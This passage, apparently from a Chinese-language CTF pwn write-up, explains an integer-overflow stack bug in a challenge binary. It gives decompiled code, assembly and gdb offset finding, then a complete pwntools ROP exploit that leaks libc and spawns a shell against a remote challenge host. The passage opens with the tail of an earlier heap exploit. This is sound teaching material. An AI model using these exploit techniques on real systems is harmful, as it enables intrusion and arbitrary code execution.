+<span class="n">pause</span><span class="p">()</span>
+<span class="n">create</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s2">"a"</span><span class="o">*</span><span class="mh">0x13</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one</span><span class="p">),</span><span class="s2">"c"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#2</span>
+
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">getshell</span><span class="p">()</span>
+</pre></div>
+<h1 data-content="1" id="528fac5e2afac4f289e6606ce29e7b04">int_overflow_pwn</h1>
+<p>这题是主要是一个整数溢出的漏洞，题目本来应该比较简单，但是由于IDA反编译的原因出现的伪c代码很奇怪，比较难分析</p>
+<p>保护机制照旧：</p>
+<pre><code>Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre>
+<p>程序逻辑：</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  void *v3; // rsp
+  void *v4; // rsp
+  int v6; // [rsp+Ch] [rbp-24h]
+  void *dest; // [rsp+10h] [rbp-20h]
+  unsigned int v8; // [rsp+1Ch] [rbp-14h]
+  _DWORD *v9; // [rsp+20h] [rbp-10h]
+  void *buf; // [rsp+28h] [rbp-8h]
+
+  v6 = argc;
+  init_stdio();
+  puts("welcome.....");
+  v3 = alloca(32LL);
+  buf = (16 * ((&amp;v6 + 3) &gt;&gt; 4));
+  read(0, (16 * ((&amp;v6 + 3) &gt;&gt; 4)), 0xCuLL);
+  v9 = buf;
+  if ( *buf != 0x6E696B53 || v9[1] != 1 )
+  {
+    puts("some thing wrong");
+  }
+  else
+  {
+    v8 = v9[2] + 32;
+    v4 = alloca(16 * ((v8 + 30) / 0x10));
+    dest = (16 * ((&amp;v6 + 3) &gt;&gt; 4));
+    memcpy((16 * ((&amp;v6 + 3) &gt;&gt; 4)), buf, 0xCuLL);
+    read(0, dest + 12, v9[2]);
+    handle_data();
+  }
+  return 0;
+}</code></pre>
+<p>首先向buf中输入12个字节</p>
+<p>得保证，buf[0]=0x6E696B53,buf[1]=0x1</p>
+<p>才能进入else中的分支</p>
+<p>接着</p>
+<p>v4 = alloca(16 * ((buf[2] +  30) / 0x10));</p>
+<p>最后</p>
+<p>read(0, dest + 12, v9[2])</p>
+<p>可以看到，这个read的字节数是我们控制的，而alloc的大小会等于16 * ((buf[2] +  30) / 0x10)</p>
+<p>可以看到，alloc的空间大小也是受buf[2]控制的</p>
+<p>我们只要构造一个buf[2]=0xffffffff就可以造成很大的输入字节，同时由于负数溢出，又可以使得alloc申请的空间较小，就容易造成栈溢出了</p>
+<p>但是这个栈溢出的偏移不好找</p>
+<p>需要看一下程序的汇编：</p>
+<pre><code>.text:00000000004007BC ; 16:   v9 = buf;
+.text:00000000004007BC                 mov     rax, [rbp+buf]
+.text:00000000004007C0                 mov     [rbp+v9], rax
+.text:00000000004007C4 ; 17:   if ( *buf != 0x6E696B53 || v9[1] != 1 )
+.text:00000000004007C4                 mov     rax, [rbp+v9]
+.text:00000000004007C8                 mov     eax, [rax]
+.text:00000000004007CA                 cmp     eax, 6E696B53h
+.text:00000000004007CF                 jnz     loc_400875
+.text:00000000004007D5                 mov     rax, [rbp+v9]
+.text:00000000004007D9                 mov     eax, [rax+4]
+.text:00000000004007DC                 cmp     eax, 1
+.text:00000000004007DF                 jnz     loc_400875
+.text:00000000004007E5 ; 23:     v8 = v9[2] + 32;
+.text:00000000004007E5                 mov     rax, [rbp+v9]
+.text:00000000004007E9                 mov     eax, [rax+8]
+.text:00000000004007EC                 add     eax, 20h
+.text:00000000004007EF                 mov     [rbp+v8], eax
+.text:00000000004007F2 ; 24:     v4 = alloca(16 * ((v8 + 30) / 0x10));
+.text:00000000004007F2                 mov     eax, [rbp+v8]
+.text:00000000004007F5                 lea     rdx, [rax+0Fh]
+.text:00000000004007F9                 mov     eax, 10h
+.text:00000000004007FE                 sub     rax, 1
+.text:0000000000400802                 add     rax, rdx
+.text:0000000000400805                 mov     esi, 10h
+.text:000000000040080A                 mov     edx, 0
+.text:000000000040080F                 div     rsi
+.text:0000000000400812                 imul    rax, 10h
+.text:0000000000400816                 sub     rsp, rax
+.text:0000000000400819                 mov     rax, rsp
+.text:000000000040081C                 add     rax, 0Fh
+.text:0000000000400820                 shr     rax, 4
+.text:0000000000400824 ; 25:     dest = (16 * ((&amp;v6 + 3) &gt;&gt; 4));
+.text:0000000000400824                 shl     rax, 4
+.text:0000000000400828                 mov     [rbp+dest], rax
+.text:000000000040082C ; 26:     memcpy((16 * ((&amp;v6 + 3) &gt;&gt; 4)), buf, 0xCuLL);
+.text:000000000040082C                 mov     rcx, [rbp+buf]
+.text:0000000000400830                 mov     rax, [rbp+dest]
+.text:0000000000400834                 mov     edx, 0Ch        ; n
+.text:0000000000400839                 mov     rsi, rcx        ; src
+.text:000000000040083C                 mov     rdi, rax        ; dest
+.text:000000000040083F                 call    _memcpy</code></pre>
+<p>通过汇编可以看到，dest的地址是存放在rax中的，于是进入gdb调试在0x400824的地方下个断点</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121191242-5d823cb0-ed7e-1.png"/></p>
+<p>接着c一下，会停在断点处：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121191253-643f0934-ed7e-1.png"/></p>
+<p>再si一下，让完成 shl   rax, 0x4指令，这时可以得到dest的地址，从而计算dest到rbp的偏移，而由于</p>
+<p>read(0, dest + 12, v9[2]);</p>
+<p>因此这个偏移需要再减去12</p>
+<p>于是覆盖至ret的偏移量就是0x7c了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181121191308-6cbe9e44-ed7e-1.png"/></p>
+<p>知道偏移量后，就很简单了</p>
+<ol>
+<li>
+<p>构造rop，首先泄漏libc，再跳转回main函数</p>
+</li>
+<li>
+<p>利用第二次栈溢出执行system(/bin/sh)</p>
+</li>
+</ol>
+<p>如果对rop不是很了解的话可以参考以下学习：</p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic_rop/" target="_blank">ctf-wiki</a></p>
+<p><a href="http://www.vuln.cn/6645" target="_blank">一步一步学ROP之linux_x86篇</a></p>
+<p><a href="http://www.vuln.cn/6644" target="_blank">一步一步学ROP之linux_x64篇</a></p>
+<p><a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/3.1.4_rop_x86.md" target="_blank">ctf-all-in-one</a></p>
+<p>exp:</p>
+<div class="highlight"><pre><span></span><span class="c1">#encoding:utf-8</span>
+<span class="c1">#!/upr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>
+<span class="n">bin_elf</span> <span class="o">=</span> <span class="s2">"./supwn7"</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span><span class="o">=</span><span class="n">bin_elf</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">bin_elf</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc64.so"</span><span class="p">)</span>
+<span class="c1">#libc = elf.libc</span>
+
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"r"</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"43.254.3.203"</span><span class="p">,</span><span class="s2">"10007"</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"l"</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">bin_elf</span><span class="p">)</span>
+<span class="c1">#-------------------------------------</span>
+<span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">rc</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">timeout</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">ru</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">timeout</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sda</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="s1">''</span><span class="p">):</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">''</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">getshell</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="c1">#-------------------------------------</span>
+<span class="n">pop_rdi</span><span class="o">=</span><span class="mh">0x00000000004008f3</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>
+<span class="n">main</span> <span class="o">=</span> <span class="mh">0x40074a</span>
+<span class="c1">#debug()</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x6E696B53</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">"welcome.....</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">sd</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x7c</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span><span class="c1">#返回main函数第二次执行</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">pause</span><span class="p">()</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">"/bin/sh</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'system'</span><span class="p">]</span>
+<span class="k">print</span> <span class="s2">"libc_base----&gt;"</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+<span class="k">print</span> <span class="s2">"system----&gt;"</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+<span class="k">print</span> <span class="s2">"binsh----&gt;"</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
+<span class="n">pause</span><span class="p">()</span>
+
+<span class="k">print</span> <span class="s2">"--------------------------hacking------------"</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x6E696B53</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s2">"welcome.....</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">sd</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x7c</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">sd</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">getshell</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
